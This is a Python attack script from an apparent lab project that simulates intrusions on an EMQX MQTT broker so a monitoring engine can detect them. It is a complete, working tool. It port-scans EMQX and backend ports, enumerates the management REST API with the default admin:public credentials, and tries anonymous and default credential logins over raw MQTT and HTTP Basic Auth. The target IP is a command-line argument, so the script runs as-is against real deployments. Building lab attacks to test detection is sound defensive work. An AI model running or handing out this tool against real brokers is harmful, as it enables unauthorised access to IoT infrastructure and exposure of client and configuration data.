"""
Attack Script: EMQX MQTT Broker (port 8884 + dashboard 18083)
==============================================================
Target  : Simulated EMQX broker (emqx_broker.py)
Default : 127.0.0.1:8884 (MQTT WebSocket) and 127.0.0.1:18083 (Dashboard)

Attacks performed
-----------------
1. PORT SCAN              — scans 20 ports including EMQX-specific ones
                            → triggers PORT_SCAN alert in monitoring engine
2. DASHBOARD ENUMERATION  — probes EMQX management REST API (port 18083)
                            → leaks broker config, connected clients, topics
3. MQTT CONNECT PROBE     — raw MQTT CONNECT on port 8884
                            → tests anonymous/default credential access
4. REST API AUTH BYPASS   — tries default admin credentials against EMQX API
                            → demonstrates hardcoded/weak credential risk

Run order
---------
  1. python Devices/MQTT/emqx_broker.py   (start the broker)
  2. python Engines/main.py               (start monitoring)
  3. python Attacks/attack_emqx.py        (run this script)

Expected monitoring alerts
--------------------------
  [PORT_SCAN]  — more than 10 distinct ports probed within 10 seconds
"""

import socket
import time
import http.client
import struct
import base64
import sys

# ── CONFIG ────────────────────────────────────────────────────────────────────
# Override with:  python attack_emqx.py <TARGET_IP> [MQTT_PORT] [DASHBOARD_PORT]
# Docker example: python attack_emqx.py 172.17.0.10 8884 18083
TARGET_IP      = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
MQTT_PORT      = int(sys.argv[2]) if len(sys.argv) > 2 else 8884
DASHBOARD_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 18083
SCAN_TIMEOUT   = 0.3
# ─────────────────────────────────────────────────────────────────────────────


def print_banner(title):
    print("\n" + "=" * 60)
    print(f"  {title}")
    print("=" * 60)


# ── ATTACK 1: PORT SCAN ───────────────────────────────────────────────────────
def attack_port_scan():
    print_banner("ATTACK 1: Port Scan — EMQX Specific Ports")
    print(f"  Target : {TARGET_IP}")
    print(f"  Action : Probing EMQX MQTT, dashboard, clustering, and metrics ports")
    print(f"  Alert  : PORT_SCAN (>10 distinct ports in 10 seconds)\n")

    # EMQX default ports + general service ports
    ports = [
        1883,           # Standard MQTT
        8083,           # EMQX MQTT over WebSocket
        8084,           # EMQX MQTT over WebSocket (TLS)
        8883,           # EMQX MQTT over TLS
        8884,           # EMQX MQTT WebSocket (this broker)
        8081,           # EMQX Management API
        18083,          # EMQX Dashboard
        4370,           # EMQX Erlang distribution
        4369,           # EMQX EPMD
        5369,           # EMQX cluster RPC
        8080,           # Alternative web
        9090,           # Prometheus metrics
        9100,           # EMQX node monitoring
        11883,          # EMQX internal MQTT
        3000,           # Grafana (monitoring)
        6379,           # Redis (session backend)
        5432,           # PostgreSQL (auth backend)
        27017,          # MongoDB (auth backend)
        2181,           # ZooKeeper
        9092,           # Kafka
    ]

    open_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(SCAN_TIMEOUT)
        result = sock.connect_ex((TARGET_IP, port))
        status = "OPEN" if result == 0 else "closed"
        if result == 0:
            open_ports.append(port)
        print(f"    Port {port:5d} : {status}")
        sock.close()

    print(f"\n  Scan complete. Open ports: {open_ports or 'none'}")
    print("  >> PORT_SCAN alert should have fired in the monitoring engine")


# ── ATTACK 2: DASHBOARD API ENUMERATION ──────────────────────────────────────
def attack_dashboard_enum():
    print_banner("ATTACK 2: EMQX Dashboard / Management API Enumeration")
    print(f"  Target : http://{TARGET_IP}:{DASHBOARD_PORT}")
    print(f"  Action : Probing EMQX REST API endpoints")
    print(f"  Goal   : Enumerate broker config, clients, topics, ACL rules\n")

    # EMQX v5 REST API endpoints
    endpoints = [
        "GET  /api/v5/broker",
        "GET  /api/v5/nodes",
        "GET  /api/v5/clients",
        "GET  /api/v5/subscriptions",
        "GET  /api/v5/topics",
        "GET  /api/v5/stats",
        "GET  /api/v5/metrics",
        "GET  /api/v5/listeners",
        "GET  /api/v5/authentication",
        "GET  /api/v5/authorization/sources",
        "GET  /api/v5/rules",
        "GET  /api/v5/plugins",
        "GET  /",
        "GET  /dashboard",
    ]

    # EMQX default credentials: admin / public
    creds = base64.b64encode(b"admin:public").decode()

    for entry in endpoints:
        method, path = entry.split(None, 1)
        try:
            conn = http.client.HTTPConnection(TARGET_IP, DASHBOARD_PORT, timeout=3)
            headers = {
                "Authorization": f"Basic {creds}",
                "User-Agent": "EMQX-Attack/1.0",
                "Accept": "application/json",
            }
            conn.request(method, path, headers=headers)
            resp = conn.getresponse()
            body = resp.read()[:150].decode(errors="ignore")
            print(f"    {method} {path:45s} → {resp.status}")
            if resp.status == 200 and body.strip():
                # Truncate to first 100 chars for readability
                print(f"      Body : {body[:100]}")
            conn.close()
        except ConnectionRefusedError:
            print(f"    {method} {path:45s} → Connection refused (device not running?)")
            break
        except Exception as e:
            print(f"    {method} {path:45s} → {type(e).__name__}")

    print("\n  >> API enumeration complete — check for 200 responses with data")


# ── ATTACK 3: MQTT CONNECT PROBE ─────────────────────────────────────────────
def _encode_remaining_length(length):
    encoded = []
    while True:
        byte = length % 128
        length //= 128
        if length > 0:
            byte |= 0x80
        encoded.append(byte)
        if length == 0:
            break
    return bytes(encoded)


def _build_connect(client_id, username=None, password=None):
    """Build raw MQTT 3.1.1 CONNECT packet."""
    connect_flags = 0x02
    if username:
        connect_flags |= 0x80
    if password:
        connect_flags |= 0x40

    cid  = client_id.encode()
    body = b'\x00\x04MQTT\x04' + bytes([connect_flags]) + b'\x00\x3c'
    body += struct.pack(">H", len(cid)) + cid

    if username:
        u = username.encode()
        body += struct.pack(">H", len(u)) + u
    if password:
        p = password.encode()
        body += struct.pack(">H", len(p)) + p

    return bytes([0x10]) + _encode_remaining_length(len(body)) + body


def attack_mqtt_probe():
    print_banner("ATTACK 3: MQTT Connection Probe (port 8884)")
    print(f"  Target : {TARGET_IP}:{MQTT_PORT}")
    print(f"  Action : Attempting MQTT CONNECT with various credentials\n")

    credentials = [
        (None,      None,       "anonymous"),
        ("admin",   "public",   "EMQX default (admin:public)"),
        ("admin",   "admin",    "common default (admin:admin)"),
        ("emqx",    "emqx",     "vendor default (emqx:emqx)"),
        ("mqtt",    "mqtt",     "generic MQTT (mqtt:mqtt)"),
        ("user",    "password", "generic (user:password)"),
    ]

    for username, password, label in credentials:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((TARGET_IP, MQTT_PORT))

            pkt  = _build_connect(f"emqx-probe", username, password)
            sock.sendall(pkt)

            resp = sock.recv(4)
            if len(resp) >= 4 and resp[0] == 0x20:
                code   = resp[3]
                result = "ACCEPTED" if code == 0 else f"rejected (code {code})"
            else:
                result = f"unexpected: {resp.hex() if resp else 'empty'}"

            print(f"    {label:35s} → {result}")
            sock.close()
            time.sleep(0.1)

        except ConnectionRefusedError:
            print("  Connection refused — is emqx_broker.py running?")
            break
        except Exception as e:
            print(f"    {label:35s} → {type(e).__name__}: {e}")

    print("\n  >> MQTT probe complete")


# ── ATTACK 4: REST API AUTH BYPASS ───────────────────────────────────────────
def attack_api_auth_bypass():
    print_banner("ATTACK 4: REST API Authentication Bypass Attempt")
    print(f"  Target : http://{TARGET_IP}:{DASHBOARD_PORT}/api/v5/clients")
    print(f"  Action : Trying known default / weak credentials via Basic Auth\n")

    # Known EMQX default credentials and common weak ones
    cred_pairs = [
        ("admin",   "public"),      # EMQX v5 default
        ("admin",   "admin"),
        ("admin",   "password"),
        ("admin",   ""),
        ("",        ""),            # No auth header at all (anonymous)
        ("emqx",    "emqx"),
        ("root",    "root"),
        ("guest",   "guest"),
    ]

    for username, password in cred_pairs:
        label = f"{username}:{password}" if username or password else "no credentials"
        try:
            conn = http.client.HTTPConnection(TARGET_IP, DASHBOARD_PORT, timeout=3)
            headers = {"User-Agent": "EMQX-AuthTest/1.0", "Accept": "application/json"}

            if username or password:
                encoded = base64.b64encode(f"{username}:{password}".encode()).decode()
                headers["Authorization"] = f"Basic {encoded}"

            conn.request("GET", "/api/v5/clients", headers=headers)
            resp = conn.getresponse()
            resp.read()
            result = f"HTTP {resp.status}"
            if resp.status == 200:
                result += "  ← AUTHENTICATED! Data exposed!"
            elif resp.status == 401:
                result += "  (401 Unauthorized)"
            print(f"    {label:30s} → {result}")
            conn.close()
        except ConnectionRefusedError:
            print("  Connection refused — is emqx_broker.py running?")
            break
        except Exception as e:
            print(f"    {label:30s} → {type(e).__name__}")

    print("\n  >> Auth bypass test complete — 200 responses mean admin access gained")


# ── MAIN ──────────────────────────────────────────────────────────────────────
def main():
    print("\n" + "#" * 60)
    print("#  AutoSecure Attack Simulation — EMQX MQTT Broker         #")
    print("#  Target : port 8884 (MQTT) + port 18083 (Dashboard)      #")
    print("#  FOR EDUCATIONAL / LAB USE ONLY                         #")
    print("#" * 60)
    print(f"\n  Target IP      : {TARGET_IP}")
    print(f"  MQTT Port      : {MQTT_PORT}")
    print(f"  Dashboard Port : {DASHBOARD_PORT}")
    print("\n  Docker: find container IP with:")
    print("    docker inspect --format '{{.NetworkSettings.IPAddress}}' autosecure-mqtt-emqx-1")
    print("  Or run:  python Attacks/get_docker_ips.py")
    print("\n  Make sure emqx_broker.py and the monitoring engine are running.")
    if "--auto" not in sys.argv:
        input("\n  Press Enter to begin attacks...")

    attack_port_scan()
    time.sleep(1)
    attack_dashboard_enum()
    time.sleep(1)
    attack_mqtt_probe()
    time.sleep(1)
    attack_api_auth_bypass()

    print("\n" + "=" * 60)
    print("  All attacks complete.")
    print("  Check the monitoring engine output for triggered alerts.")
    print("=" * 60 + "\n")


if __name__ == "__main__":
    main()
